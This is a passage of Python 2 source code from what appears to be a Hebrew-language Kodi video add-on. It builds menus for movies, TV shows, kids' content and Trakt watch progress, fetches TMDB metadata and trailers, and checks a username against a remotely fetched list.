                vidtime = xbmc.Player().getTime()
            except:
                vidtime=0
                pass
            if xbmc.Player().isPlaying() and vidtime>0:
                fail_play=False
                break
           
                
               
            time.sleep(0.100)
        
        
        
        
        
        if resume_time>0:
            try:
                xbmc.Player().seekTime(int(float(resume_time)))
            except Exception as e:
                logging.warning('Seek Err:'+str(e))
                pass
        
        while (not xbmc.abortRequested) and (xbmc.Player().isPlaying()):
             try:
                vidtime = xbmc.Player().getTime()
             except:
                vidtime = 0
             try:
                g_timer=xbmc.Player().getTime()
                g_item_total_time=xbmc.Player().getTotalTime()
             except:
                pass
             time.sleep(0.1)
        
        #dp.create('Please Wait...','Closing File', '','')
        #dp.update(0, 'Please Wait...','Canceling File', '' )
        
        #dp.update(0, 'Please Wait...','Removing File', '' )
        if resume_time!=-1:
            update_db_link(tmdb,name,season,episode,g_timer,g_item_total_time)
        xbmc.executebuiltin("Dialog.Close(busydialog)")
        
    '''
    except Exception as e:
            import linecache
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Play:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
            xbmc.executebuiltin("Dialog.Close(busydialog)")
    '''
def vip_menu():
    all_d=[]

    #movie World
    aa=addDir3('סרטים'.decode('utf8'),'www',31,'https://us.123rf.com/450wm/jagcz/jagcz1606/jagcz160600157/58409514-retro-film-production-accessories-still-life-concept-of-filmmaking-smoke-effect-on-background.jpg?ver=6','https://thumbs.dreamstime.com/b/hollywood-sign-postcard-california-illustration-vintage-hollywood-cinema-logo-design-movie-hollywood-sign-postcard-california-171714267.jpg',Addon.getLocalizedString(32074),data=-1001000750206)
    all_d.append(aa)
    # aa=addDir3('סרטים תרגום מובנה 2'.decode('utf8'),'www',31,'https://us.123rf.com/450wm/jagcz/jagcz1606/jagcz160600157/58409514-retro-film-production-accessories-still-life-concept-of-filmmaking-smoke-effect-on-background.jpg?ver=6','https://thumbs.dreamstime.com/b/hollywood-sign-postcard-california-illustration-vintage-hollywood-cinema-logo-design-movie-hollywood-sign-postcard-california-171714267.jpg',Addon.getLocalizedString(32074),data=-1001292942479)
    # all_d.append(aa)
    # aa=addDir3('סרטי מלחמה'.decode('utf8'),'www',31,'https://image.freepik.com/free-vector/mafia-mascot-logo-esport-gaming-illustration_92675-356.jpg','https://thumbs.dreamstime.com/b/hollywood-sign-postcard-california-illustration-vintage-hollywood-cinema-logo-design-movie-hollywood-sign-postcard-california-171714267.jpg',Addon.getLocalizedString(32074),data=-1001340676794)
    # all_d.append(aa)
    aa=addDir3('סדרות'.decode('utf8'),'www',31,'https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1024/https://artwolv.com/wp-content/uploads/2014/09/Nur-Media-Logo-Design-1024x683.jpg','https://thumbs.dreamstime.com/b/hollywood-sign-postcard-california-illustration-vintage-hollywood-cinema-logo-design-movie-hollywood-sign-postcard-california-171714267.jpg',Addon.getLocalizedString(32074),data=TVSHOW)
    all_d.append(aa)
    aa=addDir3('סדרות ישראליות'.decode('utf8'),'www',31,'https://www.sartamedia.com/public/images/logos/SartaLogo.png','https://thumbs.dreamstime.com/b/hollywood-sign-postcard-california-illustration-vintage-hollywood-cinema-logo-design-movie-hollywood-sign-postcard-california-171714267.jpg',Addon.getLocalizedString(32074),data=HEBREWTV)
    all_d.append(aa)
    
    aa=addDir3('מדע וטבע'.decode('utf8'),'www',31,'https://www.mimamoo.com/images/stories/jreviews/tn/tn_13434_SouthportZooGidzy_1281458138.jpg','https://www.gamereactor.eu/media/07/planetzoo_3010713b.jpg',Addon.getLocalizedString(32074),data=-1001490514316)
    all_d.append(aa)
    aa=addDir3('דוקומנטרי'.decode('utf8'),'www',31,'https://i.pinimg.com/originals/dd/c2/0f/ddc20f156dfc175bf470822ed46b3bb3.png','https://cdn.hipwallpaper.com/i/14/59/G8mUMK.jpg',Addon.getLocalizedString(32074),data=-1001178672944)
    all_d.append(aa)
    #movie World
    aa=addDir3(Addon.getLocalizedString(32075).decode('utf8'),'www',31,'https://img.freepik.com/vector-gratis/bandera-israel-hecha-pintura-brillante-sparkle-brush_1379-2132.jpg?size=626&ext=jpg','https://i.ytimg.com/vi/Hq0CZUvuSDs/maxresdefault.jpg',Addon.getLocalizedString(32075),data=HEBREW_GROUP)
    all_d.append(aa)
    # aa=addDir3('סרטי בורקס'.decode('utf8'),'www',31,'https://img.freepik.com/vector-gratis/bandera-israel-hecha-pintura-brillante-sparkle-brush_1379-2132.jpg?size=626&ext=jpg','https://i.ytimg.com/vi/Hq0CZUvuSDs/maxresdefault.jpg',Addon.getLocalizedString(32075),data=-1001336230277)
    # all_d.append(aa)
    aa=addDir3(Addon.getLocalizedString(32073),'www',31,'https://thelight.com.au/assets/uploads/2018/02/15517160600_8f5cdf7816_o.png','https://insidethemagic-119e2.kxcdn.com/wp-content/uploads/2018/08/Expo19_11x16_Poster_KeyArt_72dpi-1-792x400.jpg',Addon.getLocalizedString(32073),data=KIDS_CHAT_ID2)
    all_d.append(aa)
    aa=addDir3('סרטים וסדרות לילדים'.decode('utf8'),'www',31,'https://www.gorillatough.com/assets/images/kids-word-mark.png','https://i.ytimg.com/vi/Hq0CZUvuSDs/maxresdefault.jpg',Addon.getLocalizedString(32075),data=KIDS)
    all_d.append(aa)
    # aa=addDir3('סרטי דיסני'.decode('utf8'),'www',31,'https://www.pngkey.com/png/detail/8-87914_cartoon-transparent-mickey-mouse-disney-logo.png','https://i.ytimg.com/vi/Hq0CZUvuSDs/maxresdefault.jpg',Addon.getLocalizedString(32075),data=-1001247460404)
    # all_d.append(aa)
    # aa=addDir3('סרטי דיסני פלוס'.decode('utf8'),'www',31,'https://i1.wp.com/insightfulllife.com/wp-content/uploads/2019/09/disney-plus-logo.jpg?resize=770%2C515','https://i.ytimg.com/vi/Hq0CZUvuSDs/maxresdefault.jpg',Addon.getLocalizedString(32075),data=-1001486957972)
    # all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def movies_menu():
    all_d=[]
    aa=addDir3(Addon.getLocalizedString(32131).decode('utf8'),'http://api.themoviedb.org/3/movie/now_playing?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%lang,14,'https://image.freepik.com/free-vector/click-movie-logo-vector_18099-274.jpg','https://images.cdn1.stockunlimited.net/preview1300/cinema-background-with-movie-objects_1823387.jpg','Tmdb')
    all_d.append(aa)
    'Popular Movies'
    aa=addDir3(Addon.getLocalizedString(32047).decode('utf8'),'http://api.themoviedb.org/3/movie/popular?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%lang,14,'https://www.logolynx.com/images/logolynx/66/6627b95d1f7fc62c274242bb81e7e41d.jpeg','https://www.newszii.com/wp-content/uploads/2018/08/Most-Popular-Action-Movies.png','Tmdb')
    all_d.append(aa)
    
    aa=addDir3('כתוביות אחרונות'.decode('utf8'),'www',120,'https://www.pajiba.com/assets_c/2018/03/The%20Last%20Movie%20podcast%20logo-thumb-700xauto-194810.png','https://youprogrammer.com/wp-content/uploads/2018/01/MOvies-subtitle-download-sites.png','כתוביות אחרונות'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('הסרטים שלי'.decode('utf8'),'www',165,'https://is4-ssl.mzstatic.com/image/thumb/Purple128/v4/a9/ff/b0/a9ffb051-b871-bad3-ec4b-75b55e5e0f10/AppIcon-1x_U007emarketing-85-220-0-9.png/246x0w.png','https://is4-ssl.mzstatic.com/image/thumb/Purple128/v4/a9/ff/b0/a9ffb051-b871-bad3-ec4b-75b55e5e0f10/AppIcon-1x_U007emarketing-85-220-0-9.png/246x0w.png','הסרטים שלי'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3(Addon.getLocalizedString(32137).decode('utf8'),'http://api.themoviedb.org/3/trending/movie/week?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%lang,14,'https://seeklogo.com/images/M/movie-time-cinema-logo-8B5BE91828-seeklogo.com.png','https://www.newszii.com/wp-content/uploads/2018/08/Most-Popular-Action-Movies.png','Tmdb')
    all_d.append(aa)
    #Genre
    aa=addDir3(Addon.getLocalizedString(32048).decode('utf8'),'http://api.themoviedb.org/3/genre/movie/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&page=1'%lang,18,'https://st3.depositphotos.com/10665628/19019/v/1600/depositphotos_190192058-stock-illustration-cinema-genre-cinematography-seamless-pattern.jpg','https://s.studiobinder.com/wp-content/uploads/2019/09/Movie-Genres-Types-of-Movies-List-of-Genres-and-Categories-Header-StudioBinder.jpg','Tmdb')
    all_d.append(aa)
    #Years
    aa=addDir3(Addon.getLocalizedString(32049).decode('utf8'),'movie_years&page=1',14,'https://cdn.dribbble.com/users/2432597/screenshots/6945317/tejas-40-years-dribble_2x.jpg','https://i.pinimg.com/originals/e4/03/91/e4039182cd17c48c8f9cead44cda7df3.jpg','Tmdb')
    all_d.append(aa)
    aa=addDir3(Addon.getLocalizedString(32132).decode('utf8'),'movie_years&page=1',112,'https://cmkt-image-prd.freetls.fastly.net/0.1.0/ps/7414066/600/400/m2/fpnw/wm1/logo-design-for-movie-production-company-01-.jpg?1575502358&s=50e3d37c1ab493df98baf6eb75f2a430','https://cmkt-image-prd.freetls.fastly.net/0.1.0/ps/7414066/600/400/m2/fpnw/wm1/logo-design-for-movie-production-company-01-.jpg?1575502358&s=50e3d37c1ab493df98baf6eb75f2a430','Tmdb')
    all_d.append(aa)
    # #movie World
    # aa=addDir3(Addon.getLocalizedString(32074).decode('utf8'),'www',31,'https://image.winudf.com/v2/image1/Y29tLndNb3ZpZXNFbXBpcmVBbGxsYXRlc3Rtb3ZpZXNfODQ4OTIzMV9pY29uXzE1NTM3NjQ4NDFfMDU2/icon.png?w=170&fakeurl=1','https://cdn.hipwallpaper.com/i/14/59/G8mUMK.jpg',Addon.getLocalizedString(32074),data=-1001000750206)
    # all_d.append(aa)
    # aa=addDir3('מדע וטבע'.decode('utf8'),'www',31,'https://www.mimamoo.com/images/stories/jreviews/tn/tn_13434_SouthportZooGidzy_1281458138.jpg','https://www.gamereactor.eu/media/07/planetzoo_3010713b.jpg',Addon.getLocalizedString(32074),data=-1001490514316)
    # all_d.append(aa)
    #movie World
    # aa=addDir3(Addon.getLocalizedString(32075).decode('utf8'),'www',31,'https://image.shutterstock.com/image-photo/image-260nw-659878036.jpg','https://i.ytimg.com/vi/Hq0CZUvuSDs/maxresdefault.jpg',Addon.getLocalizedString(32075),data=HEBREW_GROUP)
    # all_d.append(aa)
    aa=addDir3('כל אוספי הסרטים'.decode('utf8'),'0',121,'https://img.creativemark.co.uk/uploads/images/353/12353/largeImg.png','https://img.creativemark.co.uk/uploads/images/353/12353/largeImg.png','מארזי סרטים'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('לפי שחקן'.decode('utf8'),'www',126,'https://hdqwalls.com/download/avengers-infinity-war-imax-poster-na-2048x1152.jpg','https://hdqwalls.com/download/avengers-infinity-war-imax-poster-na-2048x1152.jpg','לפי שחקן'.decode('utf8'))
    all_d.append(aa)
    #Search movie
    aa=addDir3(Addon.getLocalizedString(32070).decode('utf8'),'http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&append_to_response=origin_country&page=1',14,'https://cellcomtv.cellcom.co.il/globalassets/cellcomtv/content/sratim/pets-secret-life/480x543-template.jpg','http://www.videomotion.co.il/wp-content/uploads/whatwedo-Pic-small.jpg','Tmdb')
    all_d.append(aa)
    aa=addDir3('חיפוש תוכן מתקדם','advance_movie',14,'https://cdn.dribbble.com/users/2266184/screenshots/6987991/21_2x.jpg','https://cdn0.tnwcdn.com/wp-content/blogs.dir/1/files/2010/03/movies.jpg','Advance Content selection')
    all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def search_menu():
    all_d=[]
    #Search movie
    # aa=addDir3(Addon.getLocalizedString(32070).decode('utf8'),'http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&append_to_response=origin_country&page=1',14,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','http://www.videomotion.co.il/wp-content/uploads/whatwedo-Pic-small.jpg','Tmdb')
    # all_d.append(aa)
    # #Search tv
    # aa=addDir3(Addon.getLocalizedString(32071).decode('utf8'),'http://api.themoviedb.org/3/search/tv?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&page=1',14,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','http://f.frogi.co.il/news/640x300/010170efc8f.jpg','TMDB')
    # all_d.append(aa)
    # aa=addDir3('חיפושכככ','www',124,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','https://searchengineland.com/figz/wp-content/seloads/2017/12/compare-seo-ss-1920-800x450.jpg','Search')
    # all_d.append(aa)
    # aa=addDir3(Addon.getLocalizedString(32070).decode('utf8'),'http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&append_to_response=origin_country&page=1',14,'https://cellcomtv.cellcom.co.il/globalassets/cellcomtv/content/sratim/pets-secret-life/480x543-template.jpg','http://www.videomotion.co.il/wp-content/uploads/whatwedo-Pic-small.jpg','Tmdb')
    #all_d.append(aa)
    #Search tv
    # aa=addDir3(Addon.getLocalizedString(32071).decode('utf8'),'http://api.themoviedb.org/3/search/tv?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&page=1',14,'http://img.wcdn.co.il/f_auto,w_700,t_18/1/0/7/2/1072572-46.jpg','http://f.frogi.co.il/news/640x300/010170efc8f.jpg','TMDB')
    # all_d.append(aa)
    #Search All
    # aa=addDir3(Addon.getLocalizedString(32024),str(id),6,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','Search All',last_id='0$$$0',data='all')
    # all_d.append(aa)
        #Search Groups
    # aa=addDir3('חיפוש',str(id),13,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','https://cdn.ilovefreesoftware.com/wp-content/uploads/2019/06/Search-Telegram-Channels.png','Search All',last_id='0$$$0',data='all')
    # all_d.append(aa)
    aa=addDir3('חיפוש',str(id),167,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','Search All',last_id='0$$$0',data='all')
    all_d.append(aa)
    #Search History
    aa=addDir3(Addon.getLocalizedString(32072),str(id),30,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','Search All',last_id='0$$$0',data='all')
    all_d.append(aa)
    
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def main_trakt():
   all_d=[]
   aa=addDir3('רשימות','www',116,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','רשימות')
   all_d.append(aa)
   aa=addDir3('התקדמות','users/me/watched/shows?extended=full',115,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','התקדמות')
   all_d.append(aa)
   aa=addDir3('פרקים בצפייה','sync/watchlist/episodes?extended=full',115,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','התקדמות')
   all_d.append(aa)
   aa=addDir3('סדרות בצפייה','users/me/watchlist/episodes?extended=full',117,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','אוסף')
   all_d.append(aa)
   aa=addDir3('אוסף','users/me/collection/shows',117,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','אוסף')
   all_d.append(aa)
   aa=addDir3('רשימות צפייה סדרות','users/me/watchlist/shows',117,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','אוסף')
   all_d.append(aa)
   aa=addDir3('רשימות צפייה סרטים','users/me/watchlist/movies',117,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','אוסף')
   all_d.append(aa)
   aa=addDir3('סרטים שנצפו','users/me/watched/movies',117,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','אוסף')
   all_d.append(aa)
   aa=addDir3('סדרות שנצפו','users/me/watched/shows',117,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','אוסף')
   all_d.append(aa)
   aa=addDir3('Movies Collection','users/me/collection/movies',117,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','collection')
   all_d.append(aa)
   aa=addDir3('Liked lists','users/likes/lists',118,'https://kodi.expert/wp-content/uploads/2018/05/trakt-logo.png','https://seo-michael.co.uk/content/images/2016/08/trakt.jpg','Watched shows')
   all_d.append(aa)
   xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def STARTP2():
	import urllib2

	wiz=xbmcaddon.Addon('plugin.program.Anonymous')
	input= (wiz.getSetting("user"))
#	search_entered =input
	url = (UNAME)
	remote_file = urllib2.urlopen(url)
	x=remote_file.readlines()
	found=0
	
#	if not input +'\r\n' in x:
	for us in x:
		if us.split(' ==')[0] ==input or us.split()[0]==input:
			found=1
			break
	if found==0:
		yes = DIALOG.yesno("%s" % update, "[COLOR %s]שם המתשמש שהוכנס אינו נכון," % (COLOR2), "הכנס את שם המשתמש כעת[/COLOR]", nolabel='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel='[B][COLOR green]אישור[/COLOR][/B]')

		if yes:
#			setuname()
			wiz.openSettings()
	#		sys.exit()
			# STARTP2()
			return STARTP2()
		else:
			sys.exit()
#	else:
#		xbmcgui.Dialog().ok('הקוד שלך','עבר')
#		sys.exit()
	return 'ok'
def get_movie_data(url):
    html=requests.get(url).json()
    return html
def get_trakt():
    input= (Addon.getSetting("trk_user"))

    if input == '':
         Addon.openSettings()
         sys.exit()

    all_d=[]
    trakt_lists=call_trakt("users/me/lists")
    #trakt_lists=call_trakt('users/me/collection/shows')
  
    my_lists = []
    
    for list in trakt_lists:
        my_lists.append({
            'name': list["name"],
            'user': list["user"]["username"],
            'slug': list["ids"]["slug"]
        })

    for item in my_lists:
        user = item['user']
        slug = item['slug']
        url=user+'$$$$$$$$$$$'+slug
        aa=addDir3(item['name'],url,117,' ',' ',item['name'])
        all_d.append(aa)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def play_trailer(id,tv_movie):
    logging.warning('telemedia Trailer')
    if tv_movie=='movie':
        url_t='http://api.themoviedb.org/3/movie/%s/videos?api_key=1248868d7003f60f2386595db98455ef'%id
        html_t=requests.get(url_t).json()
        if 'results' in html_t:
            video_id=(html_t['results'][0]['key'])
        else:
            xbmc.executebuiltin((u'Notification(%s,%s)' % ('telemedia', 'אין טריילר')))
            sys.exit()
    else:
        url_t='http://api.themoviedb.org/3/tv/%s/videos?api_key=1248868d7003f60f2386595db98455ef'%id
        html_t=requests.get(url_t).json()
        video_id=(html_t['results'][0]['key'])
    from resources.modules.youtube_ext import get_youtube_link2
    # from youtube_ext import get_youtube_link2
    playback_url=''
    if video_id!=None:
      try:
       
        playback_url= get_youtube_link2('https://www.youtube.com/watch?v='+video_id).replace(' ','%20')
        
    
      except Exception as e:
            logging.warning('Error playing youtube:'+str(e))
            pass
      #from pytube import YouTube
      #playback_url = YouTube(domain_s+'www.youtube.com/watch?v='+video_id).streams.first().download()
         
       
        
      #playback_url = 'plugin://plugin.video.youtube/?action=play_video&videoid=%s' % video_id
      item = xbmcgui.ListItem(path=playback_url)
      xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
def progress_trakt(url):
        all_trk_data={}
        all_d=[]
        if  Addon.getSetting("fav_search_f_tv")=='true' and Addon.getSetting("fav_servers_en_tv")=='true' and len(Addon.getSetting("fav_servers_tv"))>0:
           fav_status='true'
        else:
            fav_status='false'
        if Addon.getSetting("dp")=='true':
                dp = xbmcgui.DialogProgress()
                dp.create("טוען פרקים", "אנא המתן", '')
                dp.update(0)
        import datetime
        start_time = time.time()
        xxx=0
        ddatetime = (datetime.datetime.utcnow() - datetime.timedelta(hours = 5))
        url_g=domain_s+'api.themoviedb.org/3/genre/tv/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'
     
  
        #html_g=requests.get(url_g).json()
        html_g=html_g_tv
        result = call_trakt(url)
     
        items = []
        

        new_name_array=[]
        
        for item in result:
            
            try:
                num_1 = 0
                if 'seasons' in item:
                    for i in range(0, len(item['seasons'])):
                        if item['seasons'][i]['number'] > 0: num_1 += len(item['seasons'][i]['episodes'])
                    num_2 = int(item['show']['aired_episodes'])
                    if num_1 >= num_2: raise Exception()

                    season = str(item['seasons'][-1]['number'])

                    episode = [x for x in item['seasons'][-1]['episodes'] if 'number' in x]
                    episode = sorted(episode, key=lambda x: x['number'])
                    episode = str(episode[-1]['number'])
                else:
                    season = str(item['episode']['season'])
                    episode=str(item['episode']['number'])
                

                tvshowtitle = item['show']['title']
                if tvshowtitle == None or tvshowtitle == '': raise Exception()
                tvshowtitle = replaceHTMLCodes(tvshowtitle)

                year = item['show']['year']
                year = re.sub('[^0-9]', '', str(year))
                if int(year) > int(ddatetime.strftime('%Y')): raise Exception()

                imdb = item['show']['ids']['imdb']
                if imdb == None or imdb == '': imdb = '0'

                tmdb = item['show']['ids']['tmdb']
                if tmdb == None or tmdb == '': raise Exception()
                tmdb = re.sub('[^0-9]', '', str(tmdb))
                
               
                trakt = item['show']['ids']['trakt']
                if trakt == None or trakt == '': raise Exception()
                trakt = re.sub('[^0-9]', '', str(trakt))
                if 'last_watched_at' in item:
                    last_watched = item['last_watched_at']
                else:
                    last_watched = item['listed_at']
                if last_watched == None or last_watched == '': last_watched = '0'
                items.append({'imdb': imdb, 'tmdb': tmdb, 'tvshowtitle': tvshowtitle, 'year': year, 'snum': season, 'enum': episode, '_last_watched': last_watched})
            
            except Exception as e:
               logging.warning(e)
            
            
        result = call_trakt('/users/hidden/progress_watched?limit=1000&type=show')
        result = [str(i['show']['ids']['tmdb']) for i in result]

        items_pre = [i for i in items if not i['tmdb'] in result]

      
        for items in items_pre:
          watched='no'
          not_yet=0
          gone=0
          season=items['snum']
          episode=items['enum']
    
          url='http://api.themoviedb.org/3/tv/%s?api_key=%s&language=he&append_to_response=external_ids'%(items['tmdb'],'653bb8af90162bd98fc7ee32bcbbfb3d')
          #url='http://api.themoviedb.org/3/tv/%s/season/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'%(items['tmdb'],season)
          html=cache.get(get_movie_data,time_to_save,url, table='pages')
          plot=' '
          if 'The resource you requested could not be found' not in str(html):
             data=html
            
             if 'vote_average' in data:
               rating=data['vote_average']
             else:
              rating=0
             if 'first_air_date' in data:
               year=str(data['first_air_date'].split("-")[0])
             else:
                if 'release_date' in data:
                  year=str(data['release_date'].split("-")[0])
                else:
                    year=' '
             if data['overview']==None:
               plot=' '
             else:
               plot=data['overview']
             if 'title' not in data:
               new_name=data['name']
             else:
               new_name=data['title']
             f_subs=[]
             
             original_name=data['original_name']
             id=str(data['id'])
             mode=15
             if data['poster_path']==None:
              icon=' '
             else:
               icon=data['poster_path']
             if 'backdrop_path' in data:
                 if data['backdrop_path']==None:
                  fan=' '
                 else:
                  fan=data['backdrop_path']
             else:
                fan=html['backdrop_path']
             if plot==None:
               plot=' '
             if 'http' not in fan:
               fan=domain_s+'image.tmdb.org/t/p/original/'+fan
             if 'http' not in icon:
               icon=domain_s+'image.tmdb.org/t/p/original/'+icon
             genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                    if i['name'] is not None])
             try:genere = u' / '.join([genres_list[x['id']] for x in data['genres']])
             except:genere=''

   
            
             trailer = "plugin://plugin.video.telemedia?mode=171&url=www&id=%s" % id
             if new_name not in new_name_array:
              new_name_array.append(new_name)
              if Addon.getSetting("check_subs")=='true' or Addon.getSetting("disapear")=='true':
                  if len(f_subs)>0:
                    color='white'
                  else:
                    color='red'
                    
              else:
                 color='white'
              elapsed_time = time.time() - start_time
              if Addon.getSetting("dp")=='true':
                dp.update(int(((xxx* 100.0)/(len(html))) ), ' אנא המתן '+ time.strftime("%H:%M:%S", time.gmtime(elapsed_time)),'[COLOR'+color+']'+new_name+'[/COLOR]')
              xxx=xxx+1
              if int(data['last_episode_to_air']['season_number'])>=int(season):
                if int(data['last_episode_to_air']['episode_number'])>int(episode):
                
                  episode=str(int(episode)+1)
                else:
                 if int(data['last_episode_to_air']['season_number'])>int(season):
                   season=str(int(season)+1)
                   episode='1'
                 else:
                  if (data['next_episode_to_air'])!=None:
                    episode=str(int(episode)+1)
                   
                    not_yet='1'
                  else:
                    gone=1
              else:
                    if (data['next_episode_to_air'])!=None:
                        season=str(int(season)+1)
                        episode='1'
                        not_yet='1'
                    else:
                        gone=1
              video_data={}

              

              video_data['mediatype']='tvshow'
              video_data['OriginalTitle']=new_name
              video_data['title']=new_name



              video_data['year']=year
              video_data['season']=season
              video_data['episode']=episode
              video_data['genre']=genere
              
              if len(episode)==1:
                  episode_n="0"+episode
              else:
                   episode_n=episode
              if len(season)==1:
                  season_n="0"+season
              else:
                  season_n=season
              if Addon.getSetting("trac_trk")=='true':
                addon='\n'+' עונה'+season_n+'-פרק '+episode_n
              else:
                addon=''
              video_data['plot']=plot+addon
              try:
                max_ep=data['seasons'][int(season)-1]['episode_count']
              except Exception as e:
                max_ep=100
            
              if gone==0:
                  if not_yet==0:
                  
                    if episode_n=='01':
                      dates=json.dumps((0,'' ,''))
                    elif max_ep<=int(episode):
                        dates=json.dumps(('','' ,0))
                    else:
                      dates=json.dumps(('','' ,''))
                    all_trk_data[id]={}
                    all_trk_data[id]['icon']=icon
                    all_trk_data[id]['fan']=fan
                    all_trk_data[id]['plot']=plot+addon
                    all_trk_data[id]['year']=year
                    all_trk_data[id]['original_title']=original_name
                    all_trk_data[id]['title']=new_name
                    all_trk_data[id]['season']=season
                    all_trk_data[id]['episode']=episode
                    all_trk_data[id]['eng_name']=original_title
                    all_trk_data[id]['heb_name']=new_name
                    all_trk_data[id]['type']='tv'
                    
                    
                    logging.warning('121')
                    aa=addDir3('[COLOR '+color+']'+new_name+'[/COLOR]'+' S'+season_n+'E'+episode_n,url,mode,icon,fan,plot+addon,data=year,original_title=original_name,id=id,rating=rating,heb_name=new_name,show_original_year=year,isr=isr,generes=genere,trailer=trailer,watched=watched,season=season,episode=episode,eng_name=original_title,tmdbid=id,video_info=video_data,dates=dates,fav_status=fav_status)
                    all_d.append(aa)
                  else:
                   addNolink('[COLOR red][I]'+ new_name.encode('utf8')+'[/I][/COLOR]'+' S'+season_n+'E'+episode_n, 'www',999,False,iconimage=icon,fanart=fan)
          else:
            
            logging.warning('323')
            responce=call_trakt("shows/{0}".format(items['trakt']), params={'extended': 'full'})
          
           
            addNolink('[COLOR red][I]'+ responce['title']+'[/I][/COLOR]', 'www',999,False)
        logging.warning('424')
        if Addon.getSetting("dp")=='true':
          dp.close()
        logging.warning('H7')
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_SORT_TITLE)
